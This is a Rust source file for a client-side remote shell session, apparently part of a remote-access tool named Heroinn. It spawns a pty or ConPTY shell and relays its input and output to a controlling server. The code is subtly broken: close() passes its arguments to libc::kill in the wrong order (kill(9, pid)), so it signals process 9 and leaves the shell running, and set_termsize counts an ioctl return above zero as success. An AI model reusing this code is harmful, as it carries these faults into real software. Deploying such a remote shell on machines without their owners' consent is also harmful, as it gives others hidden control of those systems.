//! Client-side interactive shell session.
//!
//! On Unix the session is a pty-backed child process; on Windows it is a
//! ConPTY process. Either way, output is relayed to the server through a
//! [`SessionBase`] channel and input arrives via [`Session::write`].

use std::io::{Read, Write};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, mpsc::Sender};

use heroinn_util::Error;
use heroinn_util::Result;
use heroinn_util::session::{ClientSession, Session, SessionBase, SessionPacket};

#[cfg(target_os = "windows")]
use windows::Win32::System::Threading::{OpenProcess, WaitForSingleObject};

#[cfg(target_os = "windows")]
use conpty::*;

/// Magic prefix marking an in-band control packet instead of shell input.
static MAGIC_FLAG: [u8; 2] = [0x37, 0x37];

/// A live shell on the client side.
pub struct ShellClient {
    id: String,
    clientid: String,
    closed: Arc<AtomicBool>,
    #[cfg(target_os = "windows")]
    process: Process,
    #[cfg(target_os = "windows")]
    writer: conpty::io::PipeWriter,
    #[cfg(not(target_os = "windows"))]
    writer: std::fs::File,
    #[cfg(not(target_os = "windows"))]
    master: i32,
    #[cfg(not(target_os = "windows"))]
    slave: i32,
    #[cfg(not(target_os = "windows"))]
    pid: i32,
    sender: Sender<SessionBase>,
}

/// Combine two big-endian bytes into a word.
fn makeword(a: u8, b: u8) -> u16 {
    ((a as u16) << 8) | b as u16
}

/// Apply a pty window size to `fd`.
#[cfg(not(target_os = "windows"))]
fn set_termsize(fd: i32, mut size: libc::winsize) -> bool {
    (unsafe { libc::ioctl(fd, libc::TIOCSWINSZ, &mut size) } as i32) > 0
}

/// Look for a shell in the `$SHELL` environment variable.
#[cfg(not(target_os = "windows"))]
fn default_shell() -> String {
    std::env::var("SHELL").unwrap_or_else(|_| "/bin/sh".to_string())
}

#[cfg(target_os = "windows")]
impl ClientSession for ShellClient {
    fn new_client(sender: Sender<SessionBase>, clientid: &str, id: &str) -> Result<Self> {
        let closed = Arc::new(AtomicBool::new(false));

        let process = conpty::spawn("cmd")
            .map_err(|e| Error::Other(format!("spawn conpty failed : {}", e)))?;

        let pid = process.pid();

        let closed_2 = closed.clone();
        std::thread::spawn(move || {
            let handle = match unsafe {
                OpenProcess(
                    windows::Win32::System::Threading::PROCESS_ALL_ACCESS,
                    false,
                    pid,
                )
            } {
                Ok(p) => p,
                Err(e) => {
                    log::info!("open shell process error : {}", e);
                    closed_2.store(true, Ordering::Relaxed);
                    return;
                }
            };

            if !handle.is_invalid() {
                unsafe { WaitForSingleObject(handle, 0xffffffff) };
            }

            log::info!("shell process exit");
            closed_2.store(true, Ordering::Relaxed);
        });

        let writer = process
            .input()
            .map_err(|e| Error::Other(format!("open shell input failed : {}", e)))?;
        let mut reader = process
            .output()
            .map_err(|e| Error::Other(format!("open shell output failed : {}", e)))?;

        let id_1 = id.to_string();
        let closed_1 = closed.clone();
        let clientid_1 = clientid.to_string();
        let sender_1 = sender.clone();
        std::thread::spawn(move || {
            loop {
                if closed_1.load(Ordering::Relaxed) {
                    break;
                }

                let mut buf: [u8; 1024] = [0; 1024];
                let size = match reader.read(&mut buf) {
                    Ok(p) => p,
                    Err(e) => {
                        log::error!("shell process reader thread exit : {}", e);
                        break;
                    }
                };

                let packet = SessionPacket {
                    id: id_1.clone(),
                    data: buf[..size].to_vec(),
                };

                if let Err(e) = sender_1.send(SessionBase {
                    id: id_1.clone(),
                    clientid: clientid_1.clone(),
                    packet,
                }) {
                    log::info!("sender closed : {}", e);
                    break;
                }
            }
            log::info!("shell worker closed");
            closed_1.store(true, Ordering::Relaxed);
        });

        Ok(Self {
            id: id.to_string(),
            clientid: clientid.to_string(),
            closed,
            writer,
            process,
            sender,
        })
    }
}

#[cfg(not(target_os = "windows"))]
impl ClientSession for ShellClient {
    fn new_client(sender: Sender<SessionBase>, clientid: &str, id: &str) -> Result<Self> {
        use std::fs::File;
        use std::os::fd::IntoRawFd;
        use std::os::unix::prelude::{CommandExt, FromRawFd};
        use std::process::{Command, Stdio};

        use nix::pty::openpty;
        use nix::unistd::{ForkResult, fork};

        let closed = Arc::new(AtomicBool::new(false));

        let ends = openpty(None, None).map_err(|e| Error::Other(format!("openpty failed : {}", e)))?;
        // `openpty` hands back owning descriptors; take the raw fds so their
        // lifetime stays managed explicitly by `close()`.
        let master = ends.master.into_raw_fd();
        let slave = ends.slave.into_raw_fd();

        let mut builder = Command::new(default_shell());

        let child_pid;
        let closed_2 = closed.clone();
        match unsafe { fork() } {
            Ok(ForkResult::Parent { child: pid, .. }) => {
                child_pid = pid.as_raw();
                std::thread::spawn(move || {
                    let mut status = 0;
                    unsafe { libc::waitpid(i32::from(pid), &mut status, 0) };
                    log::warn!("child process exit!");
                    closed_2.store(true, Ordering::Relaxed);
                });
            }
            Ok(ForkResult::Child) => {
                unsafe { libc::ioctl(master, libc::TIOCNOTTY) };
                unsafe { libc::setsid() };
                unsafe { libc::ioctl(slave, libc::TIOCSCTTY) };

                let _ = builder
                    .stdin(unsafe { Stdio::from_raw_fd(slave) })
                    .stdout(unsafe { Stdio::from_raw_fd(slave) })
                    .stderr(unsafe { Stdio::from_raw_fd(slave) })
                    .exec();
                std::process::exit(0);
            }
            Err(e) => {
                return Err(Error::Other(format!("shell fork error : {}", e)));
            }
        }

        let ptyin = unsafe { File::from_raw_fd(master) };
        let mut ptyout = unsafe { File::from_raw_fd(master) };

        let id_1 = id.to_string();
        let closed_1 = closed.clone();
        let clientid_1 = clientid.to_string();
        let sender_1 = sender.clone();
        std::thread::spawn(move || {
            loop {
                if closed_1.load(Ordering::Relaxed) {
                    break;
                }

                let mut buf = [0u8; 1024];

                let size = match ptyout.read(&mut buf) {
                    Ok(p) => p,
                    Err(_) => break,
                };

                let packet = SessionPacket {
                    id: id_1.clone(),
                    data: buf[..size].to_vec(),
                };

                if let Err(e) = sender_1.send(SessionBase {
                    id: id_1.clone(),
                    clientid: clientid_1.clone(),
                    packet,
                }) {
                    log::info!("sender closed : {}", e);
                    break;
                }
            }
            log::info!("shell worker closed");
            closed_1.store(true, Ordering::Relaxed);
        });

        Ok(Self {
            id: id.to_string(),
            clientid: clientid.to_string(),
            closed,
            sender,
            writer: ptyin,
            master,
            slave,
            pid: child_pid,
        })
    }
}

impl Session for ShellClient {
    fn id(&self) -> &str {
        &self.id
    }

    fn clientid(&self) -> &str {
        &self.clientid
    }

    fn write(&mut self, data: &[u8]) -> Result<()> {
        if data.len() == 3 && data[..2] == MAGIC_FLAG && data[2] == 0xff {
            log::info!("client closed");
            self.close();
            return Ok(());
        }

        if data.len() == 6 && data[..2] == MAGIC_FLAG {
            let row = makeword(data[2], data[3]);
            let col = makeword(data[4], data[5]);

            #[cfg(target_os = "windows")]
            self.process.resize(col as i16, row as i16).unwrap();

            #[cfg(not(target_os = "windows"))]
            set_termsize(
                self.slave,
                libc::winsize {
                    ws_row: row,
                    ws_col: col,
                    ws_xpixel: 0,
                    ws_ypixel: 0,
                },
            );
            return Ok(());
        }

        self.writer.write_all(data)?;

        Ok(())
    }

    fn alive(&self) -> bool {
        !self.closed.load(Ordering::Relaxed)
    }

    fn close(&mut self) {
        log::info!("shell closed");

        let packet = SessionPacket {
            id: self.id.clone(),
            data: vec![MAGIC_FLAG[0], MAGIC_FLAG[1], 0xff],
        };

        let _ = self.sender.send(SessionBase {
            id: self.id.clone(),
            clientid: self.clientid.clone(),
            packet,
        });

        #[cfg(not(target_os = "windows"))]
        unsafe {
            libc::kill(9, self.pid)
        };
        #[cfg(not(target_os = "windows"))]
        unsafe {
            libc::close(self.slave)
        };
        #[cfg(not(target_os = "windows"))]
        unsafe {
            libc::close(self.master)
        };

        #[cfg(target_os = "windows")]
        if let Err(e) = self.process.exit(0) {
            log::info!("exit shell process failed : {}", e);
        }

        self.closed.store(true, Ordering::Relaxed);
    }
}
